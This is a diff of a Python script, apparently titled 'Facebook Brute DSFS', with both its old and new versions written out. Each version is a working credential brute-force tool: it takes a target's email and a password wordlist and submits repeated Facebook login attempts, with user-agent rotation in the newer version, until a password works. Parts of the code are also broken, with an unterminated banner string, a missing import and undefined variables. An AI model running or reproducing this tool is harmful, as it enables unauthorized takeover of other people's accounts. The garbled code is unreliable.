@@ -1,115 +1,88 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
 
-#Creator : Anon6372098
-try:
- ##----------- Import Libraries -----------##
- import socket,time,os,sys,optparse,mechanize  ##
- ##----------------------------------------##
-except:
-	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
-	exit(1)
-################## check internet #################
-server = "www.google.com"                         #
-def check():                                      #
-   try:                                           #
-      s = socket.gethostbyname(server)            #
-      ss = socket.create_connection((s, 80), 2)   #
-      return True                                 #
-   except:                                        #
-         pass                                     #
-   return False                                   #
-                                                  #
-check = check()                                   #
-###################################################
+import sys
+import mechanize
+import cookielib
+import random
 
-os.system("clear")
-os.system("figlet FB BRUTE DSFS")
 
-parse = optparse.OptionParser("""\nUsage: python ./anonfbbrute.py -T <Target Email> -W <Wordlist File>
-OPTIONS:
-        -t <target email>        ::>   Set Target Email/Isi Email Target
-        -w <word list file>      ::>   Set Wordlist File/Isi Tempat Wordlist
-Example/Contoh:
-        ./anonfbbrute.py -t target@gmail.com -w /storage/emulated/0/passwords.txt
 
-Creator    : Anon6372098
-Team       : D4RK SYST3M F41LUR3 S33K3R (DSFS)
-Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
-Github     : https://www.github.com/Anon6372098
-Email      : anon6372098@gmail.com
-""")
-def Main():
-   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
-			help="target email !")
-   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
-			help="wordlist file !")
-   (options,args) = parse.parse_args()
-   if options.taremail !=None and options.wlst !=None: 
-     user = options.taremail
-     pass_file = options.wlst
-     global check
-     if check == True:
-	         try:
-		    pass_file = open(file_path,'r')
-		 except:
-                        print("\n[!] No Such File: "+passw+"  !!!\n")
-                        exit(1)
-		 os.system("cls || clear")
-		 time.sleep(0.10)
-		 print("\n[*] website>: www.facebook.com ")
-		 time.sleep(0.10)
-		 print("\n[+] Target Email>: "+str(user))
-		 time.sleep(0.10)
-		 print("\n[@] WordList>: "+str(passw))
-		 time.sleep(0.10)
-		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
-		 time.sleep(0.20)
-		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
-		 time.sleep(0.8)
-		 lo = 1
-		 for password in pass_file:
-				          try:
-                		             br1=mechanize.Browser()
-                		             br1.set_handle_robots(False)
-                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-                		             op=br1.open("https://facebook.com")
-		
-                	                     br1.select_form(nr=0)
-                		             br1.form["email"]=user
-                		             br1.form["pass"]=password
-                		             br1.method="POST"
-                		             res = br1.submit()
-					     result = res.get_data()
-					     if "home_icon" in result:
-                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes/Ya :)".format(lo,password.strip()))
-                   			        print ("\n[*] Found! Password is ==> "+ password)
-					        break
-						
-                		             else:
-                    			          print('[-]~[{}] Testing password[ {} ] ==> No/Bukan :('.format(lo,password.strip()))
-                    			          lo +=1
-            			          except KeyboardInterrupt:
-                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
-						 exit(1)
-     elif check == False:
-		    print("\n[!] Please Check Your Internet Connection !!!")
-		    exit(1)
-   else:
-	print(parse.usage)
-	exit(1)
 
-if __name__=='__main__':
-	Main()
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+
+
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	welcome()
+	search()
+	print("Password does not exist in the wordlist/Password tidak ada di wordlist")
+
 	
-##############################################################
-##################### 		     #########################
-#####################   END OF TOOL  #########################
-#####################                #########################
-##############################################################
-#Creator    : Anon6372098
-#Team       : D4RK SYST3M F41LUR3 S33K3R (DSFS)
-#Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
-#Contact me : anon6372098@gmail.com
-#Thanks for Using my tool/Terima kasih telah menggunakan tool saya
-#GoodBye/Selamat Tinggal
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying/Mencoba ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+#welcome 
+def welcome():
+	wel = ""
+os.system("FB Brute DSFS")
+        +=========================================+
+        |......... Facebook Brute DSFS ...........|
+        +-----------------------------------------+
+        |         Creator : Anon6372098           | 
+        |      Thanks to  : Tuan c4rt00nw4r       |
+ 	|         Github  : /Anon6372098.         |
+        | Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)|
+	+=========================================+
+        |.......... Facebook Brute DSFS ..........|
+        +-----------------------------------------+\n\n
+"""
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack/Akun yang mau di crack : {}".format(email)
+	print " [*] Loaded/Memuat :" , len(total), "passwords"
+	print " [*] Cracking, please wait/Mengcrack, tolong tunggu ...\n\n"
+
+	
+if __name__ == '__main__':
+	main()
+
